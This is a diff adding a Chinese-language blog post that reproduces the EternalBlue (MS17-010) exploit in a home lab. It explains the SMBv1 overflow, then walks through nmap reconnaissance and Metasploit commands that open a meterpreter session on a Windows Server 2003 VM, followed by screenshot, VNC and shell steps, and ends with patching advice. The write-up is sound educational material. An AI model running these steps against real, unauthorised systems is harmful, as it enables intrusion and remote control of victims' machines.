@@ -1,0 +1,962 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="永恒之蓝 复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝 复现">
+<meta property="og:url" content="http://xvshifu.github.io/2025/11/01/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="永恒之蓝 复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510291637576.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744515.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021751981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744177.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744430.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744725.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744694.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744248.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021750849.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745740.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745876.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745278.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745753.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745593.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745149.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746672.png">
+<meta property="article:published_time" content="2025-11-01T07:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-02T09:56:54.116Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>永恒之蓝 复现 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-steam"></i>
+                <span>game</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/mf" target="_self">
+                    
+                    <span>魔方</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/sl" target="_self">
+                    
+                    <span>扫雷</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/2048" target="_self">
+                    
+                    <span>2048</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/wzq" target="_self">
+                    
+                    <span>五子棋</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/txz" target="_self">
+                    
+                    <span>推箱子</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/dblk" target="_self">
+                    
+                    <span>躲避绿块</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/0" target="_self">
+                    
+                    <span>时钟1</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/1" target="_self">
+                    
+                    <span>时钟2</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="永恒之蓝 复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-01 15:00" pubdate>
+          2025年11月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">永恒之蓝 复现</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月2日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h1><p>永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445&#x2F;TCP端口的文件分享协议的漏洞进行散播。</p>
+<p>尽管微软于2017年3月14日已发布补丁修复该漏洞，但在5月12日WannaCry勒索软件利用此漏洞传播时，大量未安装补丁的用户仍然受害。</p>
+<p>鉴于WannaCry的严重性，微软罕见地为已终止支持的Windows XP、Windows 8和Windows Server 2003发布了紧急安全更新。</p>
+<p>2017年6月27日，勒索软件NotPetya再次利用永恒之蓝漏洞在欧洲传播。与普通勒索软件不同，NotPetya以破坏而非勒索为目的，即使支付赎金也无法恢复文件。真正的Petya作者随后公布了解密密钥，并声明与此次攻击无关。</p>
+<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong><font style="color:rgb(15, 17, 21);">永恒之蓝利用的是Windows系统文件共享功能中一个严重的远程代码执行漏洞。攻击者无需用户名和密码，只要目标机器的445端口是开放的，就可以通过网络直接发送一段精心构造的数据包，在目标系统上执行任意代码。</font></strong></p>
+<h2 id="核心漏洞：SMBv1-协议中的“缓冲区溢出”"><a href="#核心漏洞：SMBv1-协议中的“缓冲区溢出”" class="headerlink" title="核心漏洞：SMBv1 协议中的“缓冲区溢出”"></a><font style="color:rgb(15, 17, 21);">核心漏洞：SMBv1 协议中的“缓冲区溢出”</font></h2><p><font style="color:rgb(15, 17, 21);">永恒之蓝攻击的是Windows的</font><strong><font style="color:rgb(15, 17, 21);">SMBv1</font></strong><font style="color:rgb(15, 17, 21);"> 服务器消息块协议。这个协议主要用于网络上的文件共享、打印机共享等。漏洞的核心是一个经典的 </font><strong><font style="color:rgb(15, 17, 21);">缓冲区溢出</font></strong><font style="color:rgb(15, 17, 21);"> 漏洞。</font></p>
+<ol>
+<li><strong><font style="color:rgb(15, 17, 21);">什么是缓冲区？</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">我们可以把缓冲区想象成一个有固定容量的“容器”或“货架”，用来临时存放程序处理的数据。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">溢出是如何发生的？</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">在SMBv1协议处理特定的SMB请求（尤其是与文件事务相关的</font><code>SMBv1 TRANS2</code><font style="color:rgb(15, 17, 21);">请求）时，程序没有正确地检查用户输入数据的长度。</font><ul>
+<li><font style="color:rgb(15, 17, 21);">攻击者构造一个</font><strong><font style="color:rgb(15, 17, 21);">超长</font></strong><font style="color:rgb(15, 17, 21);">的、</font><strong><font style="color:rgb(15, 17, 21);">畸形</font></strong><font style="color:rgb(15, 17, 21);">的数据包。</font></li>
+<li>当Windows系统收到这个数据包时，会按照SMB协议去解析它。</li>
+<li><font style="color:rgb(15, 17, 21);">由于没有进行长度校验，这个超长的数据会“撑爆”系统预先分配好的那个“缓冲区”，导致多出来的数据覆盖到旁边内存区域。</font></li>
+</ul>
+</li>
+</ol>
+<h2 id="关键步骤：从溢出到控制"><a href="#关键步骤：从溢出到控制" class="headerlink" title="关键步骤：从溢出到控制"></a><font style="color:rgb(15, 17, 21);">关键步骤：从溢出到控制</font></h2><p><font style="color:rgb(15, 17, 21);">仅仅让程序崩溃（造成蓝屏）不是攻击者的目的，他们的目标是</font><strong><font style="color:rgb(15, 17, 21);">控制</font></strong><font style="color:rgb(15, 17, 21);">你的电脑。永恒之蓝通过以下精妙的步骤实现了这一点：</font></p>
+<ol>
+<li><strong><font style="color:rgb(15, 17, 21);">覆盖关键数据，劫持程序流程：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">被“撑爆”的缓冲区旁边的内存区域，存放着一些关键数据，比如</font><strong><font style="color:rgb(15, 17, 21);">函数返回地址</font></strong><font style="color:rgb(15, 17, 21);">。攻击者精心设计溢出数据，用他们指定的一个内存地址去覆盖这个返回地址。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">利用“Shellcode”执行命令：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">在溢出的数据中，攻击者会嵌入一小段恶意代码，称为</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">“Shellcode”</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">。这段代码的功能通常是：</font><strong><font style="color:rgb(15, 17, 21);">下载并执行勒索软件（如WannaCry）的后端负载，或者在系统上开一个具有高权限的后门</font></strong><font style="color:rgb(15, 17, 21);">。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">触发漏洞，跳转到攻击代码：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">当被攻击的程序（SMB服务）处理完这个畸形数据包，准备返回时，它会去读取那个被覆盖的“返回地址”。这个地址现在指向的是攻击者安排的位置。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">内核态权限提升：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">这里是最精妙也最危险的一步。永恒之蓝利用了一个名为</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">“DoublePulsar”</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">的后门。在溢出发生后，Shellcode并不会直接在用户权限下运行，而是利用Windows内核中的一个机制，将执行流程切换到</font><strong><font style="color:rgb(15, 17, 21);">内核模式</font></strong><font style="color:rgb(15, 17, 21);">。</font><ul>
+<li><strong><font style="color:rgb(15, 17, 21);">用户模式</font></strong><font style="color:rgb(15, 17, 21);">：普通程序的运行级别，权限受限。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">内核模式</font></strong><font style="color:rgb(15, 17, 21);">：操作系统的核心运行级别，拥有对系统的完全控制权。</font><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">通过一个精心构造的“任意写入”原语，攻击者可以将自己的Shellcode注入到内核空间，并提升其权限，使其以</font><strong><font style="color:rgb(15, 17, 21);">系统最高权限</font></strong><font style="color:rgb(15, 17, 21);">执行。</font></li>
+</ul>
+</li>
+</ol>
+<h2 id="攻击流程总结"><a href="#攻击流程总结" class="headerlink" title="攻击流程总结"></a><font style="color:rgb(15, 17, 21);">攻击流程总结</font></h2><p><font style="color:rgb(15, 17, 21);">一个完整的永恒之蓝攻击可以概括为以下几步：</font></p>
+<ol>
+<li><strong><font style="color:rgb(15, 17, 21);">扫描</font></strong><font style="color:rgb(15, 17, 21);">：攻击者在网络上扫描开放了</font><strong><font style="color:rgb(15, 17, 21);">445端口</font></strong><font style="color:rgb(15, 17, 21);">的Windows机器。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">发送恶意包</font></strong><font style="color:rgb(15, 17, 21);">：向目标机器的445端口发送利用SMBv1缓冲区溢出漏洞的精心构造的数据包。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">触发溢出</font></strong><font style="color:rgb(15, 17, 21);">：目标系统的SMB服务处理该数据包，发生缓冲区溢出，关键内存地址被覆盖。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">内核提权</font></strong><font style="color:rgb(15, 17, 21);">：利用DoublePulsar技术，将恶意Shellcode注入内核并提升至系统权限。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">执行载荷</font></strong><font style="color:rgb(15, 17, 21);">：在内核态执行Shellcode，通常会从攻击者控制的服务器下载并运行最终的恶意软件（如WannaCry勒索病毒）。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">横向移动</font></strong><font style="color:rgb(15, 17, 21);">：被攻陷的机器会变成一个跳板，继续在内部网络中扫描和攻击其他存在漏洞的机器，形成链式反应，这也是WannaCry能迅速蔓延全球的原因。</font></li>
+</ol>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a><font style="color:rgb(15, 17, 21);">危害</font></h2><ul>
+<li><strong><font style="color:rgb(15, 17, 21);">无需用户交互</font></strong><font style="color:rgb(15, 17, 21);">：用户不需要点击任何链接或打开任何文件，只要电脑开机并联网，就可能被攻击。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">高权限</font></strong><font style="color:rgb(15, 17, 21);">：直接获取系统内核权限，可以为所欲为。</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">蠕虫式传播</font></strong><font style="color:rgb(15, 17, 21);">：结合了漏洞利用和蠕虫特性，可以自我复制和传播。</font></li>
+</ul>
+<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><p>Windows Server 2003 ip: 192.168.126.128    关闭防火墙</p>
+<p>Kali ip: 192.168.126.129</p>
+<p>Windows Server 2003</p>
+<p>ip地址： 192.168.126.128</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510291637576.png" srcset="/img/loading.gif" lazyload></p>
+<p>关闭防火墙</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744811.png" srcset="/img/loading.gif" lazyload></p>
+<p>Kali</p>
+<p>ip a</p>
+<p>192.168.126.129</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744515.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="1-使用nmap扫一下该网段主机的存活情况"><a href="#1-使用nmap扫一下该网段主机的存活情况" class="headerlink" title="1.使用nmap扫一下该网段主机的存活情况"></a>1.<font style="color:rgb(77, 77, 77);">使用</font><font style="color:rgb(78, 161, 219) !important;">nmap</font><font style="color:rgb(77, 77, 77);">扫一下该网段主机的存活情况</font></h2><p><code>nmap -sS 192.168.126.0/24</code></p>
+<p>找到 IP为：192.168.126.128 的主机开启</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021751981.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2-扫描该主机端口从1-1000的开放情况"><a href="#2-扫描该主机端口从1-1000的开放情况" class="headerlink" title="2.扫描该主机端口从1-1000的开放情况"></a>2.<font style="color:rgb(77, 77, 77);">扫描该主机端口从1-1000的开放情况</font></h2><p><code>nmap -p 1-1000 192.168.126.128</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744177.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="3-扫描该主机的操作系统类型"><a href="#3-扫描该主机的操作系统类型" class="headerlink" title="3.扫描该主机的操作系统类型"></a><font style="color:rgb(77, 77, 77);">3.扫描该主机的操作系统类型</font></h2><p><code>nmap -O 192.168.126.128</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744430.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="4-扫描该主机上的漏洞"><a href="#4-扫描该主机上的漏洞" class="headerlink" title="4.扫描该主机上的漏洞"></a>4.<font style="color:rgb(77, 77, 77);">扫描该主机上的漏洞</font></h2><p><code>nmap --script=vuln 192.168.126.128</code></p>
+<p>存在 ms17-010 永恒之蓝</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744647.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p><strong>Metasploit</strong>项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。</p>
+<p>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。</p>
+<p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p>
+<p><code>Metasploit</code><font style="color:rgb(85, 86, 102);">（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</font></p>
+<p><font style="color:rgb(85, 86, 102);">它本身附带数百个已知软件漏洞，</font><strong><font style="color:rgb(85, 86, 102);">是一款专业级漏洞攻击工具</font></strong></p>
+<p><font style="color:rgb(85, 86, 102);">因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。</font></p>
+</blockquote>
+<h2 id="5-进入工具"><a href="#5-进入工具" class="headerlink" title="5.进入工具"></a>5.进入工具</h2><p><code>msfconsole</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744725.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="6-搜索相关漏洞"><a href="#6-搜索相关漏洞" class="headerlink" title="6.搜索相关漏洞"></a><font style="color:rgb(77, 77, 77);">6.搜索相关漏洞</font></h2><p><code>search ms17-010</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744694.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="7-选择模块"><a href="#7-选择模块" class="headerlink" title="7.选择模块"></a>7.选择模块</h2><p><code>use 10</code> 远程执行代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744248.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="8-显示配置项"><a href="#8-显示配置项" class="headerlink" title="8.显示配置项"></a>8.<font style="color:rgb(77, 77, 77);">显示配置项</font></h2><p><code>show options</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021750849.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="9-设置一下RHOSTS-靶机的ip地址"><a href="#9-设置一下RHOSTS-靶机的ip地址" class="headerlink" title="9.设置一下RHOSTS(靶机的ip地址)"></a><font style="color:rgb(77, 77, 77);">9.设置一下</font><code>RHOSTS</code><font style="color:rgb(77, 77, 77);">(靶机的ip地址)</font></h2><p><code>set RHOSTS 192.168.126.128</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745740.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="10-执行攻击"><a href="#10-执行攻击" class="headerlink" title="10.执行攻击"></a>10.执行攻击</h2><p><code>run 或者 exploit</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745876.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行成功会出现 meterpreter &gt;</p>
+<blockquote>
+<p>Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br>对目标系统进行更深入的渗透，如获取屏幕、上传&#x2F;下载文件、创建持久后门等。</p>
+</blockquote>
+<p><code>help</code><font style="color:rgb(77, 77, 77);">命令可以查看可以使用哪些命令</font></p>
+<p><code>screenshot</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745278.png" srcset="/img/loading.gif" lazyload></p>
+<p>xdg-open &#x2F;root&#x2F;KMSzAlpc.jpeg</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745753.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745455.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>run vnc</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745593.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745149.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>shell</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746089.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746672.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="预防方案"><a href="#预防方案" class="headerlink" title="预防方案"></a><font style="color:rgb(79, 79, 79);">预防方案</font></h1><ul>
+<li><font style="color:rgb(51, 51, 51);">打开防火墙，安装杀毒软件。</font></li>
+<li><font style="color:rgb(51, 51, 51);">关闭445端口及不必要的服务。</font></li>
+<li><font style="color:rgb(51, 51, 51);">安装对应补丁。</font></li>
+</ul>
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61839115/article/details/129951295">https://blog.csdn.net/qq_61839115&#x2F;article&#x2F;details&#x2F;129951295</a></p>
